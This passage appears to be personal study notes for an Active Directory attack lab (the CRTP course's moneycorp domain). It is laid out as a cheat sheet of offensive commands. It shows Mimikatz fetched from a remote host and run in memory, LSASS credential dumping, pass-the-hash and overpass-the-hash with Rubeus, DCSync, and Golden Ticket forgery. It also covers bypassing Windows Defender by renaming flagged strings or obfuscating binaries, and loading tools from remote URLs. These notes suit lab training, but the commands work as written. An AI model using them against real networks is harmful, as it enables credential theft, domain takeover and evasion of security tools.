Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock ${function:Get-PassHahses}
iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)   #load mimikatz on the memory
Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock ${function:Invoke-Mimikatz}   #run mimikatz
```
### Execute scripts from files on another machine
```
Invoke-Command -Computername dcorp-mgmt.dollarcorp.moneycorp.local -FilePath C:\scripts\Get-PassHahes.ps1   #check who you are
```
### Connect to different machines using winrs
```
winrs -r:dcorp-adminsrv cmd
winrs -remote:server1 -u:server1\administrator -p:Pass@123 hostname
```

# Lateral Movement - Mimikatz
### SafetyKatz.exe
use SafetyKatz to minidump of lsass and PELoader to run Mimikatz
```
SafetyKatz.exe "sekurlsa::ekeys"
```
### Dump Creds from LSASS process. admin privilege is required
```
privilege::debug | token::elevate | sekurlsa::logonpasswords
```
### Dump Creds on a local 
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```
### run powrshell using NTLM hash of a user
```
sekurlsa::pth /user:svcadmin /ntlm:b38ff50264b74508085d82c69794a4d8 /domain:dollarcorp.moneycorp.local /run:powershell.exe
```
### Over Pass the Hash (OPTH)
pth: you are using NTLM and targeting local accounts

opth: you are using NTLM or AES. we create a request or ticket from the DC.
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'
sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe
OR
Rubeus.exe asktgt /user:svcadmin /aes256:<aes256key> /opsec /createnetonly:C:\Windows/System32\cmd.exe /show /ptt
winrs -r:scorp-dc cmd   #use winrs to interact with DC with svcadmin user
```
### DCSync
Extract credentials from the DC without code execution on it. Domain Admin privs are required to run DCSync
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\raman"'
safetyKatz.exe "lsadump::dcsync /user:us\kebtgt" "exit"
```

# Offensive .NET
3 Steps are there. check using DefenderCheck if your payload will be detected > if yes you need to obfuscate it using Invoke-Obfuscation or ConfuserEx to obfuscate the binary > Delivery of your payload using NetLoader
### DefenderCheck 
used to identify code and strings from a binary that Windows Defender may flag   #https://github.com/matterpreter/DefenderCheck
```
DefenderCheck.exe <path to code or tool>
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/34d03437-a36f-403f-8f34-5d15bacedda1)

as we can see Windows Defender detected the string Credentials. simple you can change it to Creds to bypass Windows Defender. OR use ConfuserEX to obfuscate the binary
### NetLoader
used to load binary from filepath or URL   #https://github.com/Flangvik/NetLoader
```
Loader.exe -path http://10.10.16.10/safetykatz.exe
Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:cmd.exe" "exit"
```

### AssemblyLoad.exe
used to load the NetLoader in memory from a URL which then loads a binary from a filepath or URL
```
AssemblyLoad.exe
http://10.10.16.10/Loader.exe -path http://10.10.16.11/SafetyKatz.exe
```

# Learing Objective 7
### Find domain Admin session in a different machine
```
Find-DomainUserLocation
```
### Verify the session
```
winrs -r:<ComputerName> set computername;set username
```
copy executable file to another machine
```
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

# Golden Ticket

### Execute mimikatz on DC as DA to get krbtgt hash
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```
### use DCSync to get AES key for krbtgt account
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
# OR
SafetyKatz.exe "lsadump::dcsync /user:dcrop\krbtgt" "exit"
```
### create a Golden ticket
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
# OR
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /aes256:<aes256> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
